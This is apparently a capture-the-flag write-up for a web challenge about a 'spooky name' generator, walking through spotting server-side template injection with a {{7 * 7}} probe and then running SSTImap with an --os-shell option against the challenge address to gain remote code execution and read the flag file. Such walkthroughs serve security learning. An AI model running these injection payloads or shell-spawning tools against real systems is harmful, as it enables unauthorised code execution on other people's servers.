## Description

There's a new trend of an application that generates a spooky name for you. Users of that application later discovered that their real names were also magically changed, causing havoc in their life. Could you help bring down this application?


## Steps 

1. navigate to the website http://83.136.253.44:47350/?text=1

2. intercept the request through burpsuite and execute a simple xss payload and it triggered look at the response it uses Templates for every class so it could be SSTI 

3. try to inject simple SSTI payload into text parameter {{7 * 7}} 
result -> 

           <tbody>
                
		<tr>
			<td>         </td>
        </tr>
        
		<tr>
        	<td>         </td>
        </tr>
        
		<tr>
        	<td>       </td>
        </tr>
        
		<tr>
        	<td>{{7 * 7}}</td>
        </tr>
            </tbody>
4. use SSTImap 
python3 sstimap.py -u http://83.136.253.44:47350/?text=1 --os-shell

5. finally u got RCE 
ls /
cat /flag.txt
